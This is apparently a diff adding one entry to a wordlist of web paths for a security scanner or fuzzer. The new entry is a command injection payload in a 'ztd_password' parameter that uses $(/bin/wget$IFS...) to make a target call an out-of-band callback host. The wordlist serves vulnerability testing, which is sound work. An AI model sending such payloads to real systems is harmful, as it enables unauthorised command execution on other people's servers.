@@ -9380,3 +9380,4 @@ a
 /xmlpserver/ReportTemplateService.xls
 /servlet/UploadServlet
 /dashboard/uploadID.php
+/Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://ctu1e2la6l84rsl142k0u8ou1nqjtg4ft.oast.live)
